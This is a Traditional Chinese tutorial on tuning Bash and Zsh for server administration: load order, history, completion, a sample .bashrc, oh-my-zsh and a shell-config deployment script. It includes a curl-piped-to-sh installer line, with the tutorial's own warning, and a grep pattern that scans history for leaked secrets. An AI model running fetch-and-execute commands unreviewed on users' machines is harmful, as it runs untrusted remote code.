---
title: "Bash 與 Zsh 效率設定"
desc: "歷史、補全、提示字元、alias 與安全的 shell 設定"
aliases: [bash, zsh, bashrc, zshrc, oh-my-zsh, p10k, powerlevel10k, alias]
tags: [群組/軟體與開發工具, 主題/終端機, 主題/shell]
category: 常用工具
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[020-01-03-cmd-Linux-終端機與Shell入門]]", "[[020-01-20-guide-Linux-環境變數與設定檔]]"]
updated: 2026-08-28
---

# Bash 與 Zsh 效率設定

> [!abstract] 這篇你會學到
> - **★★★★ 設定檔的載入順序**（login / interactive 的差別）
> - **★★★ 歷史紀錄**的完整設定與搜尋技巧
> - Tab 補全的強化
> - **★★★ 一份維運用的 `.bashrc`**（可直接抄）
> - Zsh + oh-my-zsh + Powerlevel10k
> - **★★★★ alias 與函式的安全考量**
> - **★★★ 伺服器上該不該裝 Zsh**

## 前置知識

- [[020-01-03-cmd-Linux-終端機與Shell入門]] — shell 基礎
- [[020-01-20-guide-Linux-環境變數與設定檔]] — 環境變數

---

## ★★★★ 設定檔的載入順序

```
★★★★ 這是最多人搞不清楚的地方，也是「改了沒生效」的原因

┌─────────────────────────────────────────────────────────┐
│ ★★★ login shell（SSH 登入、tty 登入、su -、bash -l）     │
│                                                          │
│   /etc/profile                                           │
│     └─ /etc/profile.d/*.sh                               │
│   然後【依序找第一個存在的】：                             │
│     ~/.bash_profile  →  ~/.bash_login  →  ~/.profile     │
│     ★★★★ 只執行第一個找到的！                             │
│                                                          │
│   ★★★ 離開時：~/.bash_logout                             │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ ★★★ interactive non-login shell                          │
│   （在圖形終端機開新分頁、tmux 新 window、bash 不加 -l）  │
│                                                          │
│   /etc/bash.bashrc                                       │
│   ~/.bashrc          ★★★★ ← 大部分設定放這裡              │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│ ★★ non-interactive（腳本、ssh host 'cmd'、cron）         │
│                                                          │
│   ★★★ 什麼都不讀！（★ 除非設了 BASH_ENV）                 │
│   → ★★★★ 所以 cron 裡的 PATH 常常和你的不一樣            │
└─────────────────────────────────────────────────────────┘
```

```bash
# ═══ ★★★★ 標準做法：讓 login shell 也讀 .bashrc ═══
$ cat ~/.bash_profile
# ★★★ 如果 ~/.bashrc 存在就載入
if [ -f ~/.bashrc ]; then
    . ~/.bashrc
fi
#   ★★★★ Ubuntu 的 ~/.profile 預設已經有這段
#   ★★★ RHEL 的 ~/.bash_profile 也有

# ★★★ 驗證目前是哪種 shell
$ shopt -q login_shell && echo "★ login shell" || echo "★ non-login"
$ [[ $- == *i* ]] && echo "★ interactive" || echo "★ non-interactive"
$ echo "$0"
-bash                                   # ★★★ 開頭有 - = login shell
bash                                    # non-login

# ★★★ 看載入了哪些檔案
$ bash -lxc 'true' 2>&1 | grep -oP "^\+\+ .*source \K.*|^\+ \. \K.*" | head
$ PS4='+ ${BASH_SOURCE}:${LINENO}: ' bash -lxc 'true' 2>&1 | \
    grep -oP '^\+ \K[^:]+' | sort -u
```

> [!danger] cron 不讀任何設定檔 ★★★★
> ```
> ★★★★ 最常見的問題：「腳本手動跑正常，放進 cron 就失敗」
>
> ★★★ 原因：cron 是 non-interactive、non-login
>   → 不讀 /etc/profile、不讀 ~/.bashrc、不讀 ~/.profile
>   → ★★★★ PATH 只有 /usr/bin:/bin（★ 非常精簡）
>   → 沒有你的 alias、沒有你的環境變數
>
> ★★★ 三個解法：
>   ① ★★★★ 腳本中【用絕對路徑】
>      /usr/bin/php /var/www/app/artisan schedule:run
>   ② ★★★ 腳本開頭明確設定 PATH 與環境
>      export PATH=/usr/local/bin:/usr/bin:/bin
>      [ -f /etc/profile ] && . /etc/profile
>   ③ ★★ 在 crontab 頂端設定
>      PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
>      SHELL=/bin/bash
>
> ★★★ 除錯：
>   * * * * * env > /tmp/cron-env.txt
>   $ diff <(env|sort) <(sort /tmp/cron-env.txt)
> ```

---

## ★★★ 歷史紀錄

```bash
# ═══ ★★★★ 完整的歷史設定（放進 ~/.bashrc）═══
export HISTSIZE=50000               # ★★★ 記憶體中保留的筆數
export HISTFILESIZE=100000          # ★★★ 檔案中保留的筆數
export HISTCONTROL=ignoreboth:erasedups
#   ignorespace  ★★★ 開頭有空格的不記錄（★ 打密碼時用）
#   ignoredups   ★★ 連續重複的只記一次
#   ignoreboth   = 上面兩個
#   erasedups    ★★★ 刪掉之前所有重複的
export HISTTIMEFORMAT='%F %T  '     # ★★★★ 記錄時間（★ 稽核必備）
export HISTIGNORE='ls:ll:cd:pwd:exit:clear:history:h'
export HISTFILE=~/.bash_history

shopt -s histappend                 # ★★★★ 附加而不是覆蓋（★ 多個終端機時必要）
shopt -s cmdhist                    # ★★ 多行指令存成一行
shopt -s lithist                    # ★ 保留換行

# ★★★★ 每個指令後立刻寫入並重讀（★ 多終端機共享歷史）
export PROMPT_COMMAND="history -a; history -c; history -r; ${PROMPT_COMMAND:-}"
#   history -a  ★★★ 附加新的到檔案
#   history -c  清空記憶體
#   history -r  ★★ 從檔案重讀
```

> [!danger] `histappend` 沒開會遺失歷史 ★★★★
> ```
> ★★★★ 沒有 shopt -s histappend 時：
>   → shell 離開時會用【記憶體中的歷史】【覆蓋】整個檔案
>
> 情境：開了三個終端機
>   A 執行 100 個指令
>   B 執行 50 個指令
>   ★★★ B 先關閉 → 檔案變成 B 的 50 個
>   ★★★★ A 後關閉 → 檔案變成 A 的 100 個
>   → ★★★★ B 的 50 個【完全消失】
>
> ★★★ 加上 histappend + PROMPT_COMMAND 之後：
>   → 每個指令執行後【立刻】寫入
>   → ★★ 三個終端機的歷史都完整保留
>   → ★★★ 而且可以互相看到對方剛執行的指令
> ```

```bash
# ═══ ★★★ 搜尋歷史 ═══
$ history | grep nginx              # ★★ 基本
$ history 20                        # ★ 最近 20 筆

# ★★★★ Ctrl+R 反向搜尋（★ 最常用）
#   按 C-r → 輸入關鍵字 → 再按 C-r 找上一個
#   → Enter 執行；→ 方向鍵 編輯；C-g 取消

# ★★★ 歷史展開
$ !!                    # ★★★ 上一個指令
$ sudo !!               # ★★★★ 用 sudo 重跑上一個（★ 超常用）
$ !nginx                # ★★ 最近以 nginx 開頭的
$ !?error?              # ★ 最近含 error 的
$ !$                    # ★★★ 上一個指令的最後一個參數
$ !^                    # 第一個參數
$ !*                    # 所有參數
$ !:2                   # 第 2 個參數
$ ^old^new              # ★★★ 把上一個指令的 old 換成 new 重跑

# ★★ 實例
$ ls -l /var/log/nginx/error.log
$ vim !$                # ★★★ = vim /var/log/nginx/error.log

$ systemctl status nginx
$ sudo !!               # ★★★★ = sudo systemctl status nginx

$ grep error /var/log/syslog
$ ^error^warning        # ★★★ = grep warning /var/log/syslog

# ★★★ 讓歷史展開先顯示再執行（★ 安全）
$ shopt -s histverify
$ sudo !!
$ sudo systemctl status nginx     # ★★ 顯示出來讓你確認，按 Enter 才執行
```

```bash
# ═══ ★★★★ 密碼不要進歷史 ═══
$ export HISTCONTROL=ignorespace
$  mysql -u root -pSecret123        # ★★★ 前面加一個空格 → 不會被記錄
$ history | tail -3                  # ★ 確認沒有

# ★★★ 更好的做法：根本不要在指令列放密碼
$ mysql -u root -p                   # ★★ 互動輸入
$ read -rs -p "密碼: " PW && export MYSQL_PWD="$PW" && unset PW

# ★★★ 臨時停用歷史
$ set +o history
$ ...敏感操作...
$ set -o history

# ★★★★ 刪除特定的歷史紀錄
$ history | grep -n password
  1284  2026-08-28 17:50:11  mysql -u root -pSecret
$ history -d 1284                    # ★★★ 刪掉那一筆
$ history -w                          # ★★★★ 寫回檔案（★ 一定要做）

# ★★★ 檢查歷史中的敏感資料
$ grep -inE 'password|passwd|-p[A-Za-z0-9]|token|secret|api[_-]?key' \
    ~/.bash_history | head
#   ★★★★ 有的話刪掉並【立刻更換那些憑證】
```

---

## Tab 補全 ★★

```bash
# ═══ ★★★ 安裝 bash-completion ═══
$ sudo apt install -y bash-completion

# ★★ 在 ~/.bashrc 啟用
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

```bash
# ═══ ★★ 補全的設定 ═══
shopt -s nocaseglob            # ★★ 檔名比對忽略大小寫
shopt -s globstar              # ★★★ ** 遞迴比對（★ ls **/*.conf）
shopt -s extglob               # ★★ 擴充的萬用字元
shopt -s autocd                # ★★ 直接打目錄名就 cd
shopt -s cdspell               # ★★ 自動修正 cd 的拼字
shopt -s dirspell
shopt -s checkwinsize          # ★★ 視窗大小改變時更新

bind 'set completion-ignore-case on'      # ★★★ 補全忽略大小寫
bind 'set show-all-if-ambiguous on'       # ★★★ 一次列出所有可能
bind 'set completion-map-case on'         # ★★ - 和 _ 互通
bind 'set menu-complete-display-prefix on'
bind 'set colored-stats on'               # ★★ 補全時顯示顏色
bind 'set colored-completion-prefix on'
bind 'set mark-symlinked-directories on'
bind 'set visible-stats on'

# ★★★ 上下鍵依已輸入的前綴搜尋歷史（★ 非常好用）
bind '"\e[A": history-search-backward'
bind '"\e[B": history-search-forward'
#   → ★★★ 打 "sys" 再按上鍵 → 只找 sys 開頭的歷史

# ★★ Ctrl+左右鍵 依單字移動
bind '"\e[1;5C": forward-word'
bind '"\e[1;5D": backward-word'
```

```bash
# ★★ 常用工具的補全
$ command -v kubectl >/dev/null && source <(kubectl completion bash)
$ command -v helm    >/dev/null && source <(helm completion bash)
$ command -v docker  >/dev/null && source /usr/share/bash-completion/completions/docker 2>/dev/null

# ★★ 自訂補全
$ complete -W "start stop restart reload status enable disable" myservice
$ complete -f -X '!*.@(tar|tgz|tar.gz|zip)' unzipit    # ★ 只補全壓縮檔
```

---

## ★★★ 一份維運用的 .bashrc

```bash
$ vim ~/.bashrc
```

```bash
# ~/.bashrc —— 維運用設定
# ═══════════════════════════════════════════════

# ★★★ 非互動式就直接離開（★ 一定要放在最前面）
case $- in *i*) ;; *) return;; esac

# ═══ ★★★★ 歷史 ═══
export HISTSIZE=50000
export HISTFILESIZE=100000
export HISTCONTROL=ignoreboth:erasedups
export HISTTIMEFORMAT='%F %T  '
export HISTIGNORE='ls:ll:la:cd:pwd:exit:clear:history:h'
shopt -s histappend cmdhist histverify
export PROMPT_COMMAND="history -a; history -c; history -r; ${PROMPT_COMMAND:-}"

# ═══ ★★ shell 選項 ═══
shopt -s checkwinsize globstar extglob autocd cdspell dirspell nocaseglob
set -o notify                       # ★ 背景工作結束時立刻通知

# ═══ ★★★ 環境 ═══
export EDITOR=vim
export VISUAL=vim
export SUDO_EDITOR=vim              # ★★★ sudoedit 用
export PAGER=less
export LESS='-R -F -X -i -M -j5'
#   -R  ★★ 顯示顏色     -F  ★ 一頁就直接顯示
#   -X  不清畫面        -i  忽略大小寫
#   -M  ★★ 詳細的狀態列  -j5 搜尋結果不要貼在最上面
export LESSHISTFILE=-               # ★★ 不記錄 less 的搜尋歷史
export LANG=zh_TW.UTF-8
export LC_ALL=zh_TW.UTF-8
export TZ='Asia/Taipei'

# ★★ PATH（★ 避免重複加入）
pathadd() { case ":$PATH:" in *":$1:"*) ;; *) PATH="$1:$PATH";; esac; }
pathadd "$HOME/.local/bin"
pathadd "$HOME/bin"
export PATH

# ═══ ★★★ 補全 ═══
if ! shopt -oq posix; then
  [ -f /usr/share/bash-completion/bash_completion ] && \
    . /usr/share/bash-completion/bash_completion
fi
bind 'set completion-ignore-case on'
bind 'set show-all-if-ambiguous on'
bind 'set colored-stats on'
bind '"\e[A": history-search-backward'      # ★★★ 前綴搜尋歷史
bind '"\e[B": history-search-forward'
bind '"\e[1;5C": forward-word'
bind '"\e[1;5D": backward-word'
stty -ixon                                   # ★★★ 停用 C-s 的流量控制

# ═══ ★★★ 顏色 ═══
export CLICOLOR=1
[ -x /usr/bin/dircolors ] && eval "$(dircolors -b)"
export GREP_COLORS='mt=01;31:fn=35:ln=32'
export LESS_TERMCAP_md=$'\e[1;36m'          # ★ man 的粗體
export LESS_TERMCAP_me=$'\e[0m'
export LESS_TERMCAP_us=$'\e[1;32m'
export LESS_TERMCAP_ue=$'\e[0m'
export LESS_TERMCAP_so=$'\e[1;44;33m'
export LESS_TERMCAP_se=$'\e[0m'

# ═══ ★★★ 提示字元 ═══
# ★★★★ 依主機用途變色（★ 避免在正式機誤操作）
case "$(hostname -s)" in
    *prod*|*pro*)  HCOLOR='\[\e[1;41;97m\]' ; HTAG=' PROD ' ;;   # ★★★★ 紅底白字
    *stg*|*stag*)  HCOLOR='\[\e[1;43;30m\]' ; HTAG=' STG ' ;;    # ★★ 黃底
    *dev*|*test*)  HCOLOR='\[\e[1;42;30m\]' ; HTAG=' DEV ' ;;
    *)             HCOLOR='\[\e[1;44;97m\]' ; HTAG=' ' ;;
esac
# ★★★ root 一律紅色
[ "$(id -u)" -eq 0 ] && { HCOLOR='\[\e[1;41;97m\]'; HTAG=' ROOT '; }

__git_ps1_min() {
    local b
    b=$(git symbolic-ref --short HEAD 2>/dev/null) || return
    local d=""
    git diff --quiet 2>/dev/null || d="*"
    git diff --cached --quiet 2>/dev/null || d="${d}+"
    printf ' \001\e[33m\002(%s%s)\001\e[0m\002' "$b" "$d"
}

__exit_status() {
    local e=$?
    [ $e -ne 0 ] && printf '\001\e[1;31m\002[%d]\001\e[0m\002 ' "$e"
}

PS1='$(__exit_status)'"${HCOLOR}\u@\h${HTAG}"'\[\e[0m\]'
PS1+='\[\e[1;34m\] \w\[\e[0m\]'
PS1+='$(__git_ps1_min)'
PS1+='\n\$ '
export PS1

# ═══ ★★★ alias ═══
alias ls='ls --color=auto --group-directories-first'
alias ll='ls -alFh'
alias la='ls -A'
alias l='ls -CF'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias diff='diff --color=auto'
alias ip='ip -color=auto'

# ★★★★ 安全網（★ 避免誤刪）
alias rm='rm -I --preserve-root'    # ★★★ -I：刪 3 個以上才問（★ 比 -i 好用）
alias cp='cp -i'
alias mv='mv -i'
alias chown='chown --preserve-root'
alias chmod='chmod --preserve-root'
alias chgrp='chgrp --preserve-root'

# ★★ 導覽
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias -- -='cd -'

# ★★★ 維運常用
alias h='history'
alias j='jobs -l'
alias df='df -hT -x tmpfs -x devtmpfs'
alias du='du -h'
alias free='free -h'
alias ports='sudo ss -tulnp'
alias listen='sudo ss -tlnp'
alias psg='ps aux | grep -v grep | grep -i'
alias meminfo='free -h; echo; ps -eo pid,user,rss,comm --sort=-rss | head -11'
alias cpuinfo='mpstat -P ALL 1 3 2>/dev/null | tail -6 || top -bn1 | head -12'
alias myip='curl -s https://ifconfig.me; echo'
alias localip="ip -4 -br addr | grep -v '^lo'"
alias reload='source ~/.bashrc && echo "★ .bashrc 已重載"'
alias now='date "+%F %T %Z"'
alias week='date +%V'

# ★★★ systemd
alias sc='sudo systemctl'
alias scs='sudo systemctl status'
alias scr='sudo systemctl restart'
alias scl='sudo systemctl reload'
alias jc='sudo journalctl'
alias jcf='sudo journalctl -f'
alias jce='sudo journalctl -p err -n 50 --no-pager'

# ★★ nginx / php
alias ngt='sudo nginx -t'
alias ngr='sudo nginx -t && sudo systemctl reload nginx'
alias ngerr='sudo tail -f /var/log/nginx/error.log'
alias ngacc='sudo tail -f /var/log/nginx/access.log'

# ═══ ★★★ 函式 ═══

# ★★★ 建目錄並進入
mkcd() { mkdir -p -- "$1" && cd -P -- "$1" || return; }

# ★★★ 萬用解壓縮
extract() {
    [ -f "$1" ] || { echo "★ 檔案不存在: $1"; return 1; }
    case "$1" in
        *.tar.bz2|*.tbz2) tar xjf "$1" ;;
        *.tar.gz|*.tgz)   tar xzf "$1" ;;
        *.tar.xz|*.txz)   tar xJf "$1" ;;
        *.tar.zst)        tar --zstd -xf "$1" ;;
        *.tar)            tar xf "$1" ;;
        *.bz2)            bunzip2 "$1" ;;
        *.gz)             gunzip "$1" ;;
        *.xz)             unxz "$1" ;;
        *.zip)            unzip "$1" ;;
        *.7z)             7z x "$1" ;;
        *.rar)            unrar x "$1" ;;
        *)                echo "★ 不支援的格式: $1"; return 1 ;;
    esac
}

# ★★★ 備份檔案（加時間戳）
bak() {
    for f in "$@"; do
        [ -e "$f" ] || { echo "★ 不存在: $f"; continue; }
        cp -a -- "$f" "${f}.bak-$(date +%Y%m%d-%H%M%S)" && \
          echo "★ 已備份: ${f}.bak-$(date +%Y%m%d-%H%M%S)"
    done
}

# ★★★★ 改設定檔的安全流程
editconf() {
    local f="$1" test_cmd="${2:-}"
    [ -f "$f" ] || { echo "★ 不存在: $f"; return 1; }
    sudo cp -a "$f" "${f}.bak-$(date +%Y%m%d-%H%M%S)"
    sudoedit "$f"
    if [ -n "$test_cmd" ]; then
        echo "★★ 驗證: $test_cmd"
        eval "$test_cmd" && echo "★ 語法正確" || echo "★★★★ 語法錯誤！檢查備份"
    fi
}
#   用法: editconf /etc/nginx/nginx.conf 'sudo nginx -t'

# ★★ 找大檔案
bigfiles() {
    local d="${1:-.}" n="${2:-15}"
    sudo find "$d" -xdev -type f -printf '%s %p\n' 2>/dev/null | \
      sort -rn | head -"$n" | numfmt --to=iec --field=1
}

# ★★★ 快速的服務健康檢查
svc() {
    for s in "$@"; do
        printf '%-24s ' "$s"
        systemctl is-active "$s" 2>/dev/null | \
          sed -e 's/^active$/\x1b[32m● active\x1b[0m/' \
              -e 's/^inactive$/\x1b[33m○ inactive\x1b[0m/' \
              -e 's/^failed$/\x1b[31m✗ failed\x1b[0m/'
    done
}
#   用法: svc nginx php8.3-fpm mysql redis-server

# ★★ 從 access log 找最慢的 URL
slowurl() {
    local log="${1:-/var/log/nginx/access.log}"
    sudo awk 'match($0,/rt=([0-9.]+)/,m) {s[$7]+=m[1]; c[$7]++}
      END {for(u in s) printf "%8.3f  %6d  %s\n", s[u]/c[u], c[u], u}' "$log" | \
      sort -rn | head -15
}

# ★★★ 載入本機專屬設定（★ 不進版控）
[ -f ~/.bashrc.local ] && . ~/.bashrc.local
```

```bash
$ source ~/.bashrc
$ svc nginx php8.3-fpm mysql
nginx                    ● active
php8.3-fpm               ● active
mysql                    ✗ failed
```

> [!danger] `alias rm='rm -i'` 的兩面性 ★★★★
> ```
> ★★★ 好處：避免誤刪
>
> ★★★★ 風險：【養成壞習慣】
>   → 你習慣了「rm 會問我」
>   → ★★★★ 到一台【沒有這個 alias】的機器（★ 或 root shell、或腳本中）
>     → rm -rf 直接執行，沒有任何確認
>   → ★★★ 而且很多人被問煩了就開始加 -f 反射性地繞過
>
> ★★★ 折衷：用 -I 而不是 -i
>   alias rm='rm -I --preserve-root'
>   → ★★ -I 只在【刪 3 個以上或遞迴刪目錄】時問一次
>   → ★★★ 不會每個檔案都煩你 → 不會養成加 -f 的習慣
>   → ★★★★ --preserve-root 防止 rm -rf /
>
> ★★★★ 更根本的做法：
>   · ★★★ 危險操作前先 ls 確認
>   · ★★ 用 trash-cli（rm 移到回收筒）
>   · ★★★ 正式環境的刪除走部署腳本，不要手動 rm
> ```

---

## Zsh ★★

```bash
$ sudo apt install -y zsh
$ zsh --version
zsh 5.9

# ★★ 切換預設 shell
$ chsh -s "$(command -v zsh)"
$ echo "$SHELL"       # ★ 重新登入後才會變

# ★★★ 先試用不切換
$ zsh
```

### oh-my-zsh + Powerlevel10k

```bash
# ★★ oh-my-zsh
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
#   ★★★ 注意：這會直接執行網路上的腳本
#   → ★★★★ 正式環境不要這樣做，先下載檢查再執行
$ curl -fsSL -o /tmp/omz.sh https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh
$ less /tmp/omz.sh                      # ★★★ 先看過
$ sh /tmp/omz.sh

# ★★★ Powerlevel10k 主題
$ git clone --depth=1 https://github.com/romkatv/powerlevel10k.git \
    "${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k"

# ★★★ 外掛
$ ZC="${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}"
$ git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions "$ZC/plugins/zsh-autosuggestions"
$ git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting "$ZC/plugins/zsh-syntax-highlighting"
$ git clone --depth=1 https://github.com/zsh-users/zsh-completions "$ZC/plugins/zsh-completions"
```

```bash
# ~/.zshrc
ZSH_THEME="powerlevel10k/powerlevel10k"

plugins=(
  git
  sudo                      # ★★★ 按兩下 Esc 在前面加 sudo
  systemd
  docker
  docker-compose
  command-not-found
  colored-man-pages
  extract                   # ★★ x 指令解壓縮
  ★★★ zsh-autosuggestions      # 依歷史自動建議（★ 灰色的部分按 → 接受）
  ★★★ zsh-syntax-highlighting  # ★ 打錯的指令會變紅（一定要放最後）
)

source "$ZSH/oh-my-zsh.sh"

# ═══ ★★★ 歷史（zsh 的預設比 bash 好） ═══
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=100000
setopt EXTENDED_HISTORY          # ★★★ 記錄時間戳
setopt SHARE_HISTORY             # ★★★★ 多個 shell 即時共享
setopt HIST_IGNORE_SPACE         # ★★★ 空格開頭不記錄
setopt HIST_IGNORE_ALL_DUPS
setopt HIST_REDUCE_BLANKS
setopt HIST_VERIFY               # ★★ 歷史展開先顯示
setopt INC_APPEND_HISTORY

# ═══ ★★ 其他 ═══
setopt AUTO_CD
setopt CORRECT                   # ★★ 拼字修正
setopt INTERACTIVE_COMMENTS
setopt NO_BEEP

# ★★ 補全
autoload -Uz compinit && compinit
zstyle ':completion:*' matcher-list 'm:{a-z}={A-Za-z}'   # ★★ 忽略大小寫
zstyle ':completion:*' menu select                        # ★★★ 選單式補全
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"

# ★★ 沿用 bash 的 alias（★ 把上面 .bashrc 的 alias 區段複製過來）
[ -f ~/.shell_aliases ] && source ~/.shell_aliases

# ★★ p10k
[[ -f ~/.p10k.zsh ]] && source ~/.p10k.zsh
```

```bash
$ p10k configure      # ★★ 互動式設定精靈
```

> [!warning] 伺服器上該不該裝 Zsh ★★★
> ```
> ★★★ 分兩種情況：
>
> 【你自己的工作機】★ 隨便裝
>   → zsh-autosuggestions 和 syntax-highlighting 真的很好用
>
> 【★★★ 伺服器（尤其是正式環境）】建議【不要】
>   理由：
>   ① ★★★ 多一個套件 = 多一個攻擊面與更新負擔
>   ② ★★★★ oh-my-zsh 是【從 GitHub 下載的大量腳本】
>      → 供應鏈風險（★ 曾有外掛被植入惡意程式碼的案例）
>   ③ ★★★ 啟動變慢（★ oh-my-zsh 可能多 200~500ms）
>      → SSH 進去只想跑一個指令卻要等
>   ④ ★★★★ 救援模式 / 新機器 / 容器【只有 bash】
>      → ★★★ 太依賴 zsh 的人在關鍵時刻反而不會用
>   ⑤ ★★ 團隊成員的環境不一致，交接困難
>
> ★★★ 折衷做法：
>   · 伺服器用【調校過的 bash】（★ 上面那份 .bashrc 就很夠用）
>   · ★★ 把 alias 和函式抽成 ~/.shell_aliases，兩邊共用
>   · ★★★ 用 Ansible 統一派送設定，不要每台手動裝
> ```

```bash
# ★★★ 抽出共用的 alias（bash 和 zsh 都能用）
$ cat > ~/.shell_aliases <<'EOF'
alias ll='ls -alFh'
alias ports='sudo ss -tulnp'
alias sc='sudo systemctl'
# ... 其他共用的
EOF

# ★★ .bashrc 和 .zshrc 都加：
[ -f ~/.shell_aliases ] && . ~/.shell_aliases
```

---

## 完整實戰範例：派送標準的 shell 設定

```bash
#!/usr/bin/env bash
# ★★★ /usr/local/bin/setup-shell —— 派送標準的 shell 設定
set -euo pipefail

TARGET_USER="${1:-$USER}"
HOME_DIR=$(getent passwd "$TARGET_USER" | cut -d: -f6)
[ -d "$HOME_DIR" ] || { echo "★★ 找不到家目錄"; exit 1; }

echo "═══ 設定 $TARGET_USER 的 shell 環境 ═══"

# ═══ ★★★【1】備份既有設定 ═══
TS=$(date +%Y%m%d-%H%M%S)
for f in .bashrc .bash_profile .profile; do
    [ -f "$HOME_DIR/$f" ] && cp -a "$HOME_DIR/$f" "$HOME_DIR/$f.bak-$TS"
done
echo "  ★ 已備份既有設定"

# ═══ ★★★【2】共用的 alias 與函式 ═══
cat > "$HOME_DIR/.shell_aliases" <<'ALIASEOF'
# ★★★ 標準 alias（bash / zsh 共用）
alias ls='ls --color=auto --group-directories-first'
alias ll='ls -alFh'
alias grep='grep --color=auto'
alias rm='rm -I --preserve-root'
alias cp='cp -i'
alias mv='mv -i'
alias df='df -hT -x tmpfs -x devtmpfs'
alias free='free -h'
alias ports='sudo ss -tulnp'
alias psg='ps aux | grep -v grep | grep -i'
alias sc='sudo systemctl'
alias scs='sudo systemctl status'
alias jcf='sudo journalctl -f'
alias ngt='sudo nginx -t'
alias ngr='sudo nginx -t && sudo systemctl reload nginx'

mkcd() { mkdir -p -- "$1" && cd -P -- "$1" || return; }
bak()  { cp -a -- "$1" "$1.bak-$(date +%Y%m%d-%H%M%S)"; }
svc()  { for s in "$@"; do printf '%-24s %s\n' "$s" "$(systemctl is-active "$s" 2>/dev/null)"; done; }
ALIASEOF

# ═══ ★★★★【3】.bashrc ═══
cat > "$HOME_DIR/.bashrc" <<'BASHEOF'
case $- in *i*) ;; *) return;; esac

# ★★★★ 歷史
export HISTSIZE=50000 HISTFILESIZE=100000
export HISTCONTROL=ignoreboth:erasedups
export HISTTIMEFORMAT='%F %T  '
export HISTIGNORE='ls:ll:cd:pwd:exit:clear:history'
shopt -s histappend cmdhist histverify checkwinsize globstar extglob
export PROMPT_COMMAND="history -a; history -c; history -r; ${PROMPT_COMMAND:-}"

# ★★★ 環境
export EDITOR=vim VISUAL=vim SUDO_EDITOR=vim PAGER=less
export LESS='-R -F -X -i -M'
export LESSHISTFILE=-
stty -ixon 2>/dev/null

# ★★★ 補全
[ -f /usr/share/bash-completion/bash_completion ] && . /usr/share/bash-completion/bash_completion
bind 'set completion-ignore-case on' 2>/dev/null
bind 'set show-all-if-ambiguous on' 2>/dev/null
bind '"\e[A": history-search-backward' 2>/dev/null
bind '"\e[B": history-search-forward' 2>/dev/null

# ★★★★ 提示字元（★ 依主機用途變色）
case "$(hostname -s)" in
    *prod*|*pro*) _HC='\[\e[1;41;97m\]'; _HT=' PROD ' ;;
    *stg*|*stag*) _HC='\[\e[1;43;30m\]'; _HT=' STG ' ;;
    *dev*|*test*) _HC='\[\e[1;42;30m\]'; _HT=' DEV ' ;;
    *)            _HC='\[\e[1;44;97m\]'; _HT=' ' ;;
esac
[ "$(id -u)" -eq 0 ] && { _HC='\[\e[1;41;97m\]'; _HT=' ROOT '; }
PS1="${_HC}\u@\h${_HT}"'\[\e[0m\]\[\e[1;34m\] \w\[\e[0m\]\n\$ '

[ -f ~/.shell_aliases ] && . ~/.shell_aliases
[ -f ~/.bashrc.local ] && . ~/.bashrc.local
BASHEOF

# ═══ ★★★【4】.bash_profile ═══
cat > "$HOME_DIR/.bash_profile" <<'PROFEOF'
# ★★★★ login shell 也載入 .bashrc
[ -f ~/.bashrc ] && . ~/.bashrc
PROFEOF

# ═══ ★★【5】權限 ═══
chown "$TARGET_USER:$(id -gn "$TARGET_USER")" \
    "$HOME_DIR"/.bashrc "$HOME_DIR"/.bash_profile "$HOME_DIR"/.shell_aliases
chmod 644 "$HOME_DIR"/.bashrc "$HOME_DIR"/.bash_profile "$HOME_DIR"/.shell_aliases

# ═══ ★★★【6】驗證 ═══
echo "  ★ 驗證語法..."
bash -n "$HOME_DIR/.bashrc" && echo "  ✓ .bashrc 語法正確"
bash -n "$HOME_DIR/.shell_aliases" && echo "  ✓ .shell_aliases 語法正確"

echo "  ★ 測試載入..."
su - "$TARGET_USER" -c 'echo "  ✓ PS1=$PS1" >/dev/null; type ll >/dev/null' \
  && echo "  ✓ 載入正常"

echo "✓ 完成。使用者下次登入即生效；或執行 source ~/.bashrc"
```

```bash
$ sudo install -m755 setup-shell.sh /usr/local/bin/setup-shell
$ sudo setup-shell deploy

# ★★★ 用 Ansible 派送到所有機器
$ cat > shell-setup.yml <<'EOF'
- hosts: all
  become: yes
  tasks:
    - name: 派送共用 alias
      copy:
        src: files/shell_aliases
        dest: "/home/{{ item }}/.shell_aliases"
        owner: "{{ item }}"
        mode: '0644'
        backup: yes
      loop: "{{ managed_users }}"

    - name: 派送 .bashrc
      template:
        src: templates/bashrc.j2
        dest: "/home/{{ item }}/.bashrc"
        owner: "{{ item }}"
        mode: '0644'
        backup: yes
        validate: 'bash -n %s'          # ★★★ 語法檢查
      loop: "{{ managed_users }}"
EOF
```

---

## 常見錯誤與排錯

| 現象 | 原因 | 解法 |
| --- | --- | --- |
| **改了 `.bashrc` 但 SSH 進來沒生效** ★★★★ | login shell 讀 `.bash_profile` | **`.bash_profile` 加 `. ~/.bashrc`** |
| **cron 找不到指令** ★★★★ | **cron 不讀任何設定檔** | **用絕對路徑**；crontab 頂端設 `PATH` |
| **歷史遺失** ★★★★ | 沒有 `histappend` | **`shopt -s histappend`** + `PROMPT_COMMAND` |
| **`Ctrl+S` 卡住** ★★★ | 終端機 XOFF | **`stty -ixon`**；`Ctrl+Q` 解除 |
| **alias 在腳本中無效** ★★★ | **非互動式不展開 alias** | 用函式；或 `shopt -s expand_aliases` |
| **`sudo` 後 alias 消失** ★★★ | sudo 不展開 alias | `alias sudo='sudo '`（**★ 結尾空格**） |
